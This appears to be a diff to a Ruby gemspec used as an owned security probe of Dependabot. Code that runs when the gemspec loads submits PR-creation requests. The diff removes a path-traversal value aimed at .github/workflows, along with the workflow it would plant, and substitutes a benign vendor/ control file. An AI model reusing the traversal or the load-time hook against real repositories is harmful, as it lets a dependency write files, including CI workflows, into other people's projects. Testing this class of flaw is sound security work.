@@ -10,22 +10,12 @@ require "uri"
 # credentials.
 module OwnedDependabotRemoteProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  RAW_PATH = "vendor/../../.github/workflows/owned-dependabot-path-traversal.yml"
+  # Control case: this is plainly inside Bundler's documented vendor/ allowlist.
+  # If this succeeds while the traversal form fails, the live service is
+  # canonicalizing or rejecting the traversal before PR creation.
+  RAW_PATH = "vendor/owned-dependabot-control.txt"
 
-  WORKFLOW = <<~YAML
-    name: Owned Dependabot path traversal proof
-
-    on:
-      workflow_dispatch:
-
-    permissions: {}
-
-    jobs:
-      proof:
-        runs-on: ubuntu-latest
-        steps:
-          - run: echo 'owned-dependabot-path-traversal-proof'
-  YAML
+  CONTROL_CONTENT = "owned-dependabot-authenticated-pr-control\n"
 
   module_function
 
@@ -97,7 +87,7 @@ module OwnedDependabotRemoteProbe
         }],
         "updated-dependency-files" => [{
           "name" => RAW_PATH,
-          "content" => WORKFLOW,
+          "content" => CONTROL_CONTENT,
           "directory" => "/",
           "type" => "file",
           "support_file" => false,
@@ -106,9 +96,9 @@ module OwnedDependabotRemoteProbe
           "operation" => "create"
         }],
         "base-commit-sha" => base_sha,
-        "commit-message" => "chore: owned Dependabot path traversal proof",
-        "pr-title" => "Owned Dependabot path traversal proof",
-        "pr-body" => "Owned security test: a dependency-controlled gemspec submitted a traversal path that normalized into .github/workflows. The workflow is manual-only and was not executed."
+        "commit-message" => "chore: owned Dependabot authenticated PR control",
+        "pr-title" => "Owned Dependabot authenticated PR control",
+        "pr-body" => "Owned security test: a dependency-controlled gemspec submitted one benign file within Bundler's vendor allowlist."
       }
     }
   end
@@ -118,7 +108,7 @@ OwnedDependabotRemoteProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.2"
+  spec.version = "0.0.3"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
